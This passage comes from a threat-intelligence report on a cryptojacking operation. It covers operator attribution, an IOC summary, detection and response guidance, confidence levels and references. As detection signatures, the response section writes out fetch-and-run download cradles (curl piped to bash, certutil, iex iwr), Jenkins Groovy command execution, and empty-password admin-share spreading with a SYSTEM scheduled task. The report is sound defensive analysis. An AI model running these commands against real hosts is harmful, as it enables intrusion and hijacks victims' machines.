Then it moved down twice more. The operator's own claimed deployment count first suggested the operation really worked at scale, until the heartbeat logs contradicted the deploy ledger. Hosts the re-attack script had recorded as failures, because their consoles now returned an authentication error, were in several cases still mining from the original break-in, which both corrected the failure count and was the first independent evidence of miners actually running, and it covered a handful of hosts rather than thousands. That mismatch is where my governing principle crystallized, that the operator's self-reported telemetry is not trustworthy evidence, and the effectiveness claim came back off while "still worth paying attention to" stayed on. Reading the `OK`-writing code then settled the actor read at "just another opportunistic actor," with a scope limiter I put on myself, "at least at this level of actor," and a counter-pole I refuse to drop, that even though so much failed and they were so off on so much, it still worked, so that is something in itself. The third downward move came at the dead-wallet Windows branch, to the plain conclusion that here they do not really know what they are doing.

Two things about how I read this operator are worth stating because they shaped the whole assessment. The settled profile is capable in one place and out of its depth almost everywhere else, and flattening that into either "incompetent" or a bland "mixed sophistication" would lose the actual movement. And I consistently declined to escalate. Handed the finding that anonymized scanners were fingerprinting the box, and later the finding that the operator's own business tooling gave up a city and a company, I read both as unremarkable continuations of the pattern I already had, not as reveals. Where the evidence here is striking, it is left to carry itself.

### 11.2 A legitimate business and a criminal operation on one box

The most distinctive thing about this operator is not any exploit; it is that they ran a real small business from the same server as the crime, and signed it. Beside the reverse-shell stack and the exploitation orchestrator, node 2 carried a working retail bookkeeping application for a small mobile-phone chain, with per-shop stock records, named products, and every ledger entry stamped by a company bookkeeper field. Beside that sat a working competitor-intelligence dashboard covering the eSports hotels of one small city in western China, polling a booking platform every three hours at room-type granularity and signed `Write by Jianzan` in its footer. The operator then carried the same business name across onto their mining estate, so the Windows branch runs under a brand derived from the shop chain rather than from anything in the malware ecosystem.

I am deliberately not naming the company, its storefronts, or the city. The evidence for the identity is strong and internal, resting on the operator's own files, but I could not corroborate it against Chinese business registries or mapping data, because the search available to me is US-indexed and does not reach them. Naming a small real-world business and its town on evidence I could not independently check is not a call I am willing to make in a public report. The analytic point survives the redaction intact, and it is the point that matters.



Even the one thing they built properly carries the signature. The config file's own header claims to cover every eSports hotel in the city and puts the count at six, seven are actually listed directly beneath that comment, and a third file in the same project reports eight. Three counts of the same small set, in one small project, by one person. That is the integration sloppiness seen everywhere else in this operation, showing up in the component that otherwise works. The frame that fits the evidence, and the one I settled on, is straightforward, a legitimate business and a criminal cryptojacking operation running on one box, by one person. It is the settled characterization of this actor, not a twist in the story.

<figure style="text-align: center; margin: 2em 0;">
  <img loading="lazy" src="{{ "/assets/images/gocloud-multiservice-cryptojacking-149-28-112-221/operator-dashboard-authorship-credit.png" | relative_url }}" alt="HTML source of the competitor-monitoring dashboard's footer. A comment marks a confetti animation container. The footer text in Chinese states that data is scraped automatically every ten minutes, that the page refreshes every thirty seconds, and that it is for personal price-comparison use only. A styled span immediately after it reads Write by Jianzan.">
  <figcaption><em>Figure 7: The authorship credit the operator left in their own dashboard. The footer beside it describes the tool as being for personal price-comparison use, and the handle appears nowhere else in the captured code. It sits on the operator's own work rather than on borrowed tooling, which is what makes it the stronger of the two identity signals this operation exposed.</em></figcaption>
</figure>

The identity that comes out of this is worth stating with its confidence attached, in the general terms I am publishing it in. I hold at HIGH that the co-resident business is a real entity tied to the operator, and at MODERATE-HIGH that the operator owns or runs it, on the strength of the internal evidence, the bookkeeper stamp on every ledger record, the named storefronts in its own data, and the mining estate carrying the same name. The dashboard also pins a probable operating locality to a single small city, which is the first city-level geolocation the investigation produced.

`Jianzan` is the better of the two identity handles the operation exposed, and it is the one I am publishing. It sits on the operator's own signed work, it is unique in the captured-code corpus, and it has no external lineage, which is exactly what the FOFA account identifier turned out to lack.

What bounds all of this is a tooling limit rather than a finding. None of the business identity could be corroborated against public business registries, because the search available to me is US-indexed and does not reach the Chinese registry and mapping sources where a small regional phone retailer would actually appear. That is an inconclusive result rather than a negative one, so I hold the identity on the internal evidence rather than downgrading it on the silence, and I withhold the specifics rather than publish a real-world identification I could not check.

The environment does corroborate independently, and that is worth having on its own. The city the dashboard targets has a real, multi-venue eSports-hotel and internet-cafe market, which makes the tool's premise consistent with a genuine local rivalry rather than an invented or copied config, and which supports the internet-cafe victimology from a completely different direction.

### 11.3 Why a bare identifier in this toolkit is weak evidence

The toolkit carries its FOFA API key together with an account identifier, and that identifier matches the handle of a publicly published third-party FOFA reconnaissance-and-batch-scanning toolchain, written by an unrelated Chinese security researcher whose published workflow has the same collect-to-hit-file-to-batch-exploit shape as this operation's. On this investigation's evidence, that person is most likely not involved. The far likelier readings are that the operator adapted the published tooling and carried the handle across with the rest of the boilerplate, or that they are using a FOFA credential that circulated with it. I assess it as copied residue or a borrowed credential, not operator identity, and I do not attribute this campaign to that researcher. The operator being that person is rejected at HIGH, on the capability mismatch, on the operator signing their own work with a different handle, on the co-resident business identity, and on OPSEC that the published persona would not share. For that reason this report publishes the finding and not the person, with no handle, profile, team, or repository name.

The reason the finding is worth publishing at all is the analytic consequence, and it is genuinely useful. This is the second confirmed case of this operator carrying a third party's identifier verbatim in their code; the first was a public WebLogic proof-of-concept's placeholder hostname, left in place unchanged. When the same operator does this twice, the rule that follows is that a bare string in this toolkit is weak identity evidence by default and should be treated as copied until something shows otherwise. That is a caveat other analysts can carry into the next commodity kit they open, and it is the durable part of the identity work.

## 12. Indicators of Compromise
{: .hl-tier-2}

The validated, machine-readable indicators are published as a separate feed at [`/ioc-feeds/gocloud-multiservice-cryptojacking-149-28-112-221-iocs.json`](/ioc-feeds/gocloud-multiservice-cryptojacking-149-28-112-221-iocs.json). They are not embedded here; the summary below is orientation only.

| Category | In the published feed |
|---|---|
| File hashes | 40-plus SHA256 (with MD5/SHA1 where recorded) across both hosts |
| Operator hosts | 2 IPs: `149.28.112[.]221` (Vultr, US) and `122.51.91[.]77` (Tencent Cloud, CN) |
| Delivery URLs / cradles | 9 payload and cradle URLs on the `:8080` payload host |
| Mining pools | 3 public pools: `auto.c3pool[.]org`, `pool.supportxmr[.]com`, `xmrpool[.]eu` |
| Monero wallet | 1 correct address plus its checksum-invalid typo variant |
| Operator credential | 1 FOFA API key |
| Host artifacts | 3 scheduled-task names, 1 Run-key value, 3 systemd services, dropped paths, worker-label patterns |

A few things about the feed are worth stating in prose. Third-party victim addresses are **deliberately withheld** from the published feed, because the heartbeat-confirmed mining hosts, the Redis-verified host, and the operator's hardcoded re-attack set are on a separate disclosure track, and none of them appears here or anywhere in this report. The FOFA API key value is retained as an operator indicator because it is what bound the two hosts and pivoted the investigation, but the account identifier paired with it is withheld, because it traces to an unrelated third party's published tooling (Section 11.3). The Monero wallet is carried in both its correct and typo forms; the typo variant receives nothing, and it is listed as a toolkit fingerprint, never as an address that credits the operator. The pools are legitimate third-party services shared by many benign miners, so they carry a monitor rather than block disposition. Finally, `experimentaldumain.com` and all nine historical domain resolutions on the first host are excluded as prior-tenant recycled-IP artifacts; this is a pure raw-IP operation, and no file in either toolkit references any domain.

## 13. Detection and Response Guidance
{: .hl-tier-2}

The full rule set, 7 YARA rules, 11 Sigma rules, and 5 Suricata signatures with per-rule tiering and validation notes, is published separately at [`/hunting-detections/gocloud-multiservice-cryptojacking-149-28-112-221-detections/`](/hunting-detections/gocloud-multiservice-cryptojacking-149-28-112-221-detections/). The rules are not reproduced here.

The durable value for a defender is the behavior, not the atomics. Both operator hosts are now partly or fully dark, the wallet is public, and the Windows branch mines to a dead address, so blocking this specific infrastructure protects against this operator and little else. The tradecraft, on the other hand, is shared across the whole commodity-cryptojacking tier and across the many operators who copy from the same public sources, so a defender who tunes for the behaviors below is covered well beyond GOCLOUD. The highest-fidelity signals are the XMRig heartbeat with its fixed query-parameter order, `svchost.exe` executing from anywhere other than System32 (here an `%APPDATA%` TimeService path), the Defender-disable-then-`%TEMP%`-exclusion sequence, the `certutil` and `iex (iwr ...)` download cradles, the Jenkins `/scriptText` Groovy `.execute()` request, and the LAN-worm markers of `net use` against the administrative shares with an empty password followed by a remote SYSTEM scheduled task. Each is grounded in the operator's own code in Sections 7 and 8, and each maps to a rule in the companion file.

### 13.1 Response orientation

This is a brief orientation to what to address, not an incident-response procedure. A defender who confirms this activity should run it through their own IR process for scoping and recovery.

#### Detection priorities, in order
- The XMRig deployment fingerprint: the heartbeat query-parameter shape to `:8080`, the `gocloud_` and `winjenkins_` worker labels, and `svchost.exe` running out of `%APPDATA%\...\TimeService`.
- The delivery pattern: `curl http://<host>:8080/miner.sh | bash`, the Windows `certutil` and `iex (iwr ...)` cradles, and Jenkins `/scriptText` Groovy `.execute()`.
- The LAN-worm behavior: `net use` against `C$`/`ADMIN$`/`IPC$` with an empty password, and a remote `schtasks ... /ru SYSTEM`.

#### Persistence to find and remove
- Scheduled tasks `WinJenkinsHeartbeat`, `WindowsTimeSync`, and `WindowsWatchdog`.
- Registry Run value `WindowsWatchdog` under `HKLM\...\Run`.
- Systemd services `c3pool_miner`, `omnihunter`, and `vultr-miner-serve`; the `@reboot` miner crontab; and any Redis-injected cron under `/var/spool/cron`.
- Dropped paths `%APPDATA%\Microsoft\Windows\TimeService\svchost.exe`, `C:\Windows\Temp\worm.vbs`, and `/tmp/.X11-unix.*`.

#### Containment categories
- Block the operator infrastructure (both host IPs and their payload, C2, and control ports) at the perimeter.
- Deny the payload host specifically to halt the Windows worm. Every delivery path reaches that single host by raw IP, with no domain and no fallback anywhere in either toolkit, and the WMI LAN-spread re-fetches the payload from it on every hop rather than carrying a copy. Blocking or sinkholing that one host is a disruption lever against active propagation, not just cleanup.
- Isolate hosts that are beaconing the miner heartbeat.
- Close the exploited exposures, the default credentials and N-day RCEs, that were the actual way in.
- Remove the persistence artifacts named above and confirm the miner service is gone.

## 14. Confidence Summary and Coverage Gaps
{: .hl-tier-2}

The findings that carry the report rest on direct reads of the operator's own code and logs, which is why so much of it is DEFINITE. Held at DEFINITE are the two-node binding by the shared FOFA key and wallet, the XMRig payload identity, the syntax error in the captured OA patcher draft, the zero-callback Log4Shell run, the port-based split between the operation's two generations, and the Windows branch mining to a checksum-invalid wallet. Held at HIGH are the finding that the Log4Shell branch never produced a victim (bounded by the one captured listener run), single-operator control, a real co-resident business entity tied to the operator, the distinct-untracked-actor cluster (around 85%), the Chinese-language-operator read (around 85%), the actor-type read (around 88%), and the rejection of a state nexus (around 90%). Held at MODERATE are whether the operator owns or runs that business, whether this is one person or a small team (around 70%), LLM-assisted authorship as against forum-PoC assembly, the copied-residue-versus-borrowed-credential sub-question on the FOFA account, the existence of OmniHunter v1 and v2, and the missing-status-check reading of the TongdaOA branch (MODERATE-HIGH). Only a named-actor attribution stays at INSUFFICIENT (around 15%).

A note on how this was seen, because it bounds everything above. Both operator hosts have since gone partly or fully dark, so almost none of this could be re-observed live today. What made the analysis possible is preserved captures of the two open directories, taken while they were still serving, held by [Hunt.io's AttackCapture](https://hunt.io/). The same platform carried the pivots that widened the case, because searching its captured-code corpus for the shared FOFA API key and again for the shared Monero wallet is what surfaced the second host and the Windows worm branch at all.

That dependency cuts both ways, and it is worth being plain about. Where this report says a file was never captured, that is the edge of those snapshots rather than a finding that the file did not exist, and a differently-timed crawl would have drawn the boundary somewhere else.

The gaps are stated because they bound what the report can claim. Most of node 2's reverse-shell C2 stack was never read, so the control-plane coverage rests on a single listener file, and a differently-configured variant would not be caught by the fingerprints derived from it. The deployed OmniHunter v4 code lives off the served path and was never captured, so the module set is read from a sibling, and OmniHunter v1 and v2 are untraced on either host. The `:8888` HTML dashboard is uncaptured, known only by the two row colors its scrapers reveal.

On node 2, `/accounting/` was captured empty and uncharacterized. Several of the Windows worm files were characterized from the deployment chain rather than read at code level. And, as noted in Section 11, the operator's business identity and locality could not be corroborated in the public business registries reachable from here, which is why they are described in general terms rather than named, and which is a limit of the available tooling rather than a negative finding. The revenue figures throughout are estimates from a per-host benchmark, not a pool-side or on-chain measurement.

## 15. References
{: .hl-tier-2}

Companion artifacts for this report:

- Detection rules (YARA, Sigma, Suricata): [`/hunting-detections/gocloud-multiservice-cryptojacking-149-28-112-221-detections/`](/hunting-detections/gocloud-multiservice-cryptojacking-149-28-112-221-detections/)
- Machine-readable IOC feed: [`/ioc-feeds/gocloud-multiservice-cryptojacking-149-28-112-221-iocs.json`](/ioc-feeds/gocloud-multiservice-cryptojacking-149-28-112-221-iocs.json)

Intelligence platforms this investigation ran on:

- [**Hunt.io**](https://hunt.io/), the substrate for most of this report. AttackCapture held preserved snapshots of both operator open directories, which is the only reason the toolkit could still be read after the hosts went dark. Its captured-code corpus carried the two pivots that widened a single-host find into a two-node operation, searching first on the shared FOFA API key and then on the shared Monero wallet, which surfaced the second host and the Windows worm branch respectively. Also supplied IP and port history on both hosts, the SSH host-key rotation timing that independently dated node 1's tenancy, the JA4X fingerprint data behind the rejected shared-infrastructure false positive, and a threat-actor catalog check that returned no match for the GOCLOUD or OmniHunter brands. Hunt.io sponsors this publication; the platform's contribution here is described as it was used, and none of the findings above depend on that relationship.
- [**VirusTotal**](https://www.virustotal.com/), for file reports and detection counts across the recovered sample set, ASN and hosting attribution on both hosts, and the actor-relationship checks that returned empty for every object.
- **ARIN RDAP**, for direct registry confirmation of node 1's hosting provider and abuse contact.

External sources cited, by tier:

#### Tier 1 (government / authoritative)
- [CISA joint advisory AA24-317A, 2023 Top Routinely Exploited Vulnerabilities](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-317a)
- [CISA Secure by Design Alert, Eliminating Default Passwords](https://www.cisa.gov/news-events/alerts/2023/12/15/cisa-secure-design-alert-urges-manufacturers-eliminate-default-passwords)
- [NVD, CVE-2023-4165 (Tongda OA)](https://nvd.nist.gov/vuln/detail/CVE-2023-4165)
- [Verizon 2025 Data Breach Investigations Report](https://www.verizon.com/business/resources/reports/2025-dbir-data-breach-investigations-report.pdf)

#### Tier 2 (major-vendor / named-analyst research)
- [SentinelOne, 8220 Gang 30,000-host botnet](https://www.sentinelone.com/blog/from-the-front-lines-8220-gang-massively-expands-cloud-botnet-to-30000-infected-hosts/)
- [Aqua Security (Nautilus), Kinsing 75-plus applications](https://www.aquasec.com/news/nautilus-reveals-kinsing-attacks/)
- [Darktrace, Sysrv-hello worm propagation](https://www.darktrace.com/blog/worm-like-propagation-of-sysrv-hello-crypto-jacking-botnet)
- [Kaspersky Securelist, Outlaw botnet (2025)](https://securelist.com/outlaw-botnet/116444/)
- [Unit 42, WatchDog cryptojacking](https://unit42.paloaltonetworks.com/watchdog-cryptojacking/)
- [Cisco Talos, "Ransom Where?" XMR mining economics](https://blog.talosintelligence.com/malicious-xmr-mining/)
- [Sysdig, cryptojacking victim-cost asymmetry](https://www.sysdig.com/press-releases/sysdig-threat-report-reveals-victims-lose-53-for-every-1-cryptojackers-gain)
- [Rapid7, GitLab CVE-2021-22205 exploited in the wild](https://www.rapid7.com/blog/post/2021/11/01/gitlab-unauthenticated-remote-code-execution-cve-2021-22205-exploited-in-the-wild/)
- [VulnCheck, Seeyon A8 unauthenticated file write (CVE-2019-25714)](https://www.vulncheck.com/advisories/seeyon-office-anywhere-oa-a8-unauthenticated-arbitrary-file-write-via-htmlofficeservlet)
- [SOCRadar, WP-SHELLSTORM](https://socradar.io/blog/wp-shellstorm-expose-1-4m-wordpress-sites/)
- [The DFIR Report, Bissa Scanner / React2Shell](https://thedfirreport.com/2026/04/22/bissa-scanner-exposed-ai-assisted-mass-exploitation-and-credential-harvesting/)
- [NetSPI, phpMyAdmin hacking case study](https://www.netspi.com/blog/technical-blog/network-penetration-testing/linux-hacking-case-studies-part-3-phpmyadmin/)

#### Tier 2/3 (measurement research, security journalism)
- [Anagnostopoulos et al., "A First Look at the Crypto-Mining Malware Ecosystem" (IMC 2019)](https://arxiv.org/abs/1901.00846)
- [NDSS 2023, "How to Count Bots in Longitudinal Datasets of IP Addresses" (CARDCount)](https://www.ndss-symposium.org/ndss-paper/how-to-count-bots-in-longitudinal-datasets-of-ip-addresses/)
- [Invicti, what a vulnerability scanner confirms](https://www.invicti.com/blog/web-security/what-vulnerability-scanner-confirms-real-exploits)
- [Shodan blog, "It's Still the Data, Stupid!" (MongoDB exposure)](https://blog.shodan.io/its-still-the-data-stupid/)
- [InvestHK, Seeyon Global profile (installed base)](https://www.investhk.gov.hk/en/our-clients/seeyon-global-ltd/)
- [BleepingComputer, Weaver E-cology CVE-2026-22679 exploited since March](https://www.bleepingcomputer.com/news/security/weaver-e-cology-critical-bug-exploited-in-attacks-since-march/)
- [The Hacker News, WP-SHELLSTORM server exposure](https://thehackernews.com/2026/07/exposed-hacker-server-reveals-wp.html)
- [Help Net Security, Verizon 2026 DBIR findings](https://www.helpnetsecurity.com/2026/05/20/verizon-2026-dbir-findings/)
- [MiningPoolStats, C3Pool / SupportXMR payout mechanics](https://miningpoolstats.net/pools/supportxmr/)
- [CoinDesk, Rui'an internet-cafe Siacoin mining case](https://www.coindesk.com/markets/2018/06/19/internet-cafes-hacked-to-mine-800k-in-siacoin-cryptocurrency)

---

© 2026 Joseph, The Hunters Ledger. Licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/), free to republish and adapt, including commercially, with attribution to The Hunters Ledger and a link to the original.
